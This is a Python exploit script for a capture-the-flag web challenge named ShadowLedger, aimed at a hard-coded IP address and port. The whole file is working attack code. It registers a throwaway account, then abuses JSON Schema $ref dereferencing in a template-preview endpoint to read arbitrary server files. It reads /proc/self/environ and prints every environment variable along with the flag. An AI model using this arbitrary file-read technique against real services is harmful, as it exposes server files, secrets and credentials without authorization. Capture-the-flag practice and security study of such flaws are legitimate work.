#!/usr/bin/env python3
"""
ShadowLedger - ISCC 2026 Web Challenge Exploit
Target: 39.105.213.28:12606

Vulnerability: Arbitrary file read via JSON Schema $ref dereference in /api/template/preview
"""

import requests
import json
import sys

TARGET = "http://39.105.213.28:12606"

def register_session():
    """Register a new user and return a session"""
    sess = requests.Session()
    username = "exploit_" + __import__("os").urandom(4).hex()
    password = "pass123"
    r = sess.post(f"{TARGET}/api/register", json={"username": username, "password": password})
    if r.json().get("ok"):
        r = sess.post(f"{TARGET}/api/login", json={"username": username, "password": password})
        return sess
    return None

def read_file(session, filepath):
    """Read arbitrary file using $ref dereference"""
    payload = {
        "schema": {
            "type": "object",
            "properties": {
                "content": {"$ref": filepath}
            }
        }
    }
    r = session.post(f"{TARGET}/api/template/preview", json=payload)
    result = r.json()
    if result.get("ok"):
        return result.get("preview", {}).get("properties", {}).get("content", "")
    return f"Error: {result.get('error', 'unknown')}"

def read_env(session):
    """Read environment variables via /proc/self/environ"""
    raw = read_file(session, "/proc/self/environ")
    if isinstance(raw, str):
        vars_list = raw.split("\0")
        env = {}
        for item in vars_list:
            if "=" in item:
                key, val = item.split("=", 1)
                env[key] = val
        return env
    return raw

if __name__ == "__main__":
    print("[*] Registering session...")
    sess = register_session()
    if not sess:
        print("[-] Failed to register")
        sys.exit(1)
    print("[+] Session ready")

    print("\n[*] Reading environment variables via /proc/self/environ...\n")
    env = read_env(sess)

    if isinstance(env, dict):
        for k, v in sorted(env.items()):
            print(f"  {k}={v}")

        flag = env.get("FLAG", env.get("flag", "Not found"))
        print(f"\n[+] FLAG: {flag}")
    else:
        print(f"Raw output: {env}")
